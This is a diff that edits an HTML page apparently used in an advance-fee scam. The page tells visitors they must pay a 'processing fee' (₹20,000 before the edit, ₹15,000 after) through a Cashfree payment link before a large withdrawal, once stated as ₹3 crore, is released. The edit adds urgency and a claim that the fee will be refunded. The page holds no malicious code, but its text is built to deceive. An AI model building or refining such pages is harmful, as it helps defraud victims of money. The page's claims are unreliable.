@@ -2,44 +2,57 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Withdrawal Payment</title>
+  <title>Withdrawal Process</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-color: #f3f3f3;
       display: flex;
+      height: 100vh;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      background-color: #f3f3f3;
     }
-    .container {
-      background-color: #fff;
+    .box {
+      background: white;
       padding: 30px;
       border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
       text-align: center;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      max-width: 500px;
     }
     .btn {
       margin-top: 20px;
       padding: 12px 25px;
-      background-color: #28a745;
+      background-color: #007bff;
       color: white;
       border: none;
-      border-radius: 8px;
-      font-size: 16px;
       cursor: pointer;
-      text-decoration: none;
+      font-size: 16px;
+      border-radius: 5px;
     }
-    .btn:hover {
-      background-color: #218838;
+    .important-note {
+      color: #d9534f;
+      font-weight: bold;
+      margin: 20px 0;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Withdrawal Verification</h1>
-    <p>To complete your ₹3,00,00,000 withdrawal, please pay ₹20,000 for verification.</p>
-    <a class="btn" href="https://payments.cashfree.com/links?code=z8f6c0csag80" target="_blank">Pay Now</a>
+  <div class="box">
+    <h2>Withdrawal Process</h2>
+    <p>To complete your withdrawal, you need to pay a processing fee of ₹15,000.</p>
+    
+    <div class="important-note">
+      Your withdrawal will be processed only after successful payment.
+    </div>
+    
+    <p>This fee will be refunded back to you along with your withdrawal amount.</p>
+    
+    <a href="https://payments.cashfree.com/links?code=z8f6c0csag80" class="btn">Pay Now ₹15,000</a>
+    
+    <p style="margin-top: 30px; font-size: 12px; color: #666;">
+      Payment will be processed securely via Cashfree Payments
+    </p>
   </div>
 </body>
 </html>
